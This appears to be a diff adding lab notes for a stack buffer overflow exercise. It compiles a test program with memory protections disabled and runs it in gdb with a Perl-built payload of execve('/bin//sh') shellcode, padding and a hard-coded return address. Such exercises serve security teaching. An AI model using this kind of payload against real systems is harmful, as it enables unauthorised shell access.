@@ -1,0 +1,8 @@
+gcc -w -m32 -fno-pie -static -O0 -fno-stack-protector -z execstack -ggdb -mpreferred-stack-boundary=2 -o test test.c
+
+nasm -f elf32 mysh.s -o mysh.o
+ld -m elf_i386 mysh.o -o mysh
+
+gdb test
+
+run $(perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80" . "a"x77 . "\x84\xee\xff\xbf"')
